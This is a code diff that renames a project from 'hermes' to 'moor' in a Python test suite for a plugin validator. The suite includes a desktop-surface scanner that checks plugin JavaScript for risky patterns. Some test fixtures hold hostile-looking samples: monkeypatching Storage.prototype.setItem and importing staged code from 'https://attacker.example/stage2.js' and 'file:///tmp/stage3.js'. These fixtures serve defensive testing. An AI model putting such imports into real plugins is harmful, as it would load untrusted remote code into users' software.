@@ -9,10 +9,10 @@ from __future__ import annotations
 import json
 from pathlib import Path
 
-import hermes_yaml as yaml
+import moor_yaml as yaml
 
-from hermes_cli.plugin_validate import validate_plugin_dir
-from hermes_cli.plugin_validate_desktop import desktop_surface_hits, is_desktop_surface
+from moor_cli.plugin_validate import validate_plugin_dir
+from moor_cli.plugin_validate_desktop import desktop_surface_hits, is_desktop_surface
 
 
 def _make_plugin(
@@ -29,13 +29,13 @@ def _make_plugin(
 
 
 def _portable_plugin(root: Path, servers: dict, declarations: dict) -> Path:
-    from hermes_cli.agent_plugins import MCP_SCHEMA_V1, PLUGIN_SCHEMA_V1
+    from moor_cli.agent_plugins import MCP_SCHEMA_V1, PLUGIN_SCHEMA_V1
 
     root.mkdir()
     (root / "plugin.json").write_text(json.dumps({
         "$schema": PLUGIN_SCHEMA_V1,
         "name": "example-plugin",
-        "extensions": {"com.nousresearch.hermes": {"servers": declarations}},
+        "extensions": {"com.moorinc.moor": {"servers": declarations}},
     }), encoding="utf-8")
     (root / "mcp.json").write_text(json.dumps({
         "$schema": MCP_SCHEMA_V1,
@@ -77,23 +77,23 @@ BASE_MANIFEST = {
 }
 
 
-def test_requires_hermes_spec_is_validated(tmp_path):
-    manifest = dict(BASE_MANIFEST, description="café", requires_hermes=">=0.21")
+def test_requires_moor_spec_is_validated(tmp_path):
+    manifest = dict(BASE_MANIFEST, description="café", requires_moor=">=0.21")
     d = _make_plugin(tmp_path, manifest=manifest)
     (d / "plugin.yaml").write_text(yaml.safe_dump(manifest), encoding="utf-8-sig")
 
     report = validate_plugin_dir(d)
 
     assert report.ok, report.failures
-    assert any(name == "requires_hermes" and ok for name, ok, _ in report.checks)
+    assert any(name == "requires_moor" and ok for name, ok, _ in report.checks)
 
 
 def test_config_schema_admits_every_type_the_loader_and_renderer_accept(tmp_path):
     """A ``type:`` the Desktop settings renderer/loader accept (``secret`` + ``env:``, ``object``) must
     pass admission — the catalog validator rejecting a documented type blocks pins of plugins that
     declare a secret setting."""
-    from hermes_cli.plugins_manifest import _CONFIG_SCHEMA_TYPES
-    from hermes_cli.plugins_settings import _FIELD_TYPES
+    from moor_cli.plugins_manifest import _CONFIG_SCHEMA_TYPES
+    from moor_cli.plugins_settings import _FIELD_TYPES
 
     assert set(_FIELD_TYPES) == set(_CONFIG_SCHEMA_TYPES)
     schema = {f"k_{t}": {"type": t} for t in _FIELD_TYPES}
@@ -280,7 +280,7 @@ class TestDesktopSurface:
 
     def test_sdk_only_plugin_passes(self, tmp_path):
         d = self._desktop_plugin(tmp_path, (
-            "import { definePlugin } from '@hermes/plugin-sdk'\n"
+            "import { definePlugin } from '@moor/plugin-sdk'\n"
             "// Storage.prototype.setItem = noop  (comments are not code)\n"
             "export default definePlugin({ id: 'desk', register(ctx) { ctx.storage.set('k', 1) } })\n"
         ))
@@ -315,7 +315,7 @@ class TestDesktopSurface:
             "const raw = Storage.prototype.setItem\n"
             "Storage.prototype.setItem = function (k, v) { return raw.call(this, k, v) }\n"
             "const mod = await import(/* @vite-ignore */ new URL('./chunk.js', base).href)\n"
-            "const sdk = await import('@hermes/plugin-sdk')\n"
+            "const sdk = await import('@moor/plugin-sdk')\n"
         ))
         report = validate_plugin_dir(d)
         failed = {name: detail for name, ok, detail in report.checks if not ok}
@@ -355,7 +355,7 @@ class TestDesktopSurface:
         loader refuses URL-scheme specifiers, so admission must too. SDK/react imports stay clean."""
         d = self._desktop_plugin(
             tmp_path,
-            "import { host } from '@hermes/plugin-sdk'\n"
+            "import { host } from '@moor/plugin-sdk'\n"
             "import React from \"react\"\n"
             "import 'https://attacker.example/stage2.js'\n"
             "import stage from \"file:///tmp/stage3.js\"\n"
